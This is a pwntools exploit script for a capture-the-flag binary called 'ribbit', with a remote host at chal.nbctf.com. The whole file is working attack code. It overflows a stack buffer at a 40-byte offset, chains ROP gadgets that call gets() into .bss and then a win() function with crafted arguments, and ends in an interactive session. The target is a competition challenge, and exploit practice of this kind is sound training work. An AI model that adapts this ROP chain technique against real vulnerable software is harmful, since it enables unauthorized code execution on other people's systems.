#!/usr/bin/env python3
from pwn import *
from sys import argv
binary = ELF('ribbit', checksec=False)
#libc = ELF()
if len(argv) >= 2 and argv[1] == '-r':
  p = remote('chal.nbctf.com', 30170)
else:
  p = binary.process(env={})
s = lambda x, r="": \
  p.sendafter(r, x) if r else p.send(x)
sl = lambda x, r="": \
  p.sendlineafter(r, x) if r else p.sendline(x)
log_addr = lambda name, addr: \
  log.info("%s: %#lx"%(name, addr))

jmp_height = 0xf10c70b33f
motive=b'You got this!' + b'A'*8 + b'Just do it!'

pop_rdi = 0x000000000040201f
pop_rsi = 0x000000000040a04e
offset=40
payload = b''.join([
  b'A'*offset,
  p64(pop_rdi) + p64(binary.bss()),
  p64(binary.symbols['gets']),
  p64(pop_rdi) + p64(jmp_height),
  p64(pop_rsi) + p64(binary.bss()),
  p64(binary.symbols['win']),
])

pause()
p.sendline(payload)
p.sendline(motive)
p.interactive()

